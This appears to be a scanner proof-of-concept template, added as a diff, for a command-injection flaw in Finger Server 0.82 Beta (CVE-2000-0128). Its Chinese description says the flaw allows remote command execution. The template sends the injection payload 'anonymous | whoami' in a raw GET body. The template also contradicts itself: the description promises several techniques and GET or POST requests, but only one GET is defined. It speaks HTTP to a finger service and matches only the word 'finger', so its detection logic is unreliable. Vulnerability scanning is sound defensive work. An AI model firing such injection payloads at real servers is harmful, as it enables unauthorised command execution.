@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "The Finger Server 0.82 Beta 版本存在命令注入漏洞，远程攻击者可通过向 Finger 服务发送包含 Shell 元字符（如管道符 |、分号 ;、反引号 ` 等）的特制查询请求，绕过输入验证并在服务器上下文中执行任意系统命令。该 PoC 实现对多种命令注入技术的检测和利用，包括简单管道命令、命令链、命名命令输出重定向等，利用 GET 或 POST 请求向 Finger 服务发送恶意有效载荷，实现远程代码执行。"
+id = "POC-AVE-2000-0333"
+name = "The Finger Server 0.82 Beta - Pipe Command Injection PoC"
+severity = "critical"
+tags = ["ave-2000-0333"]
+vuln_id = [
+    "CVE-2000-0128",
+    "AVE-2000-0333",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}:{{Port}}"
+protocol = "http"
+
+[poc.requests.body]
+content = "anonymous | whoami"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["finger"]
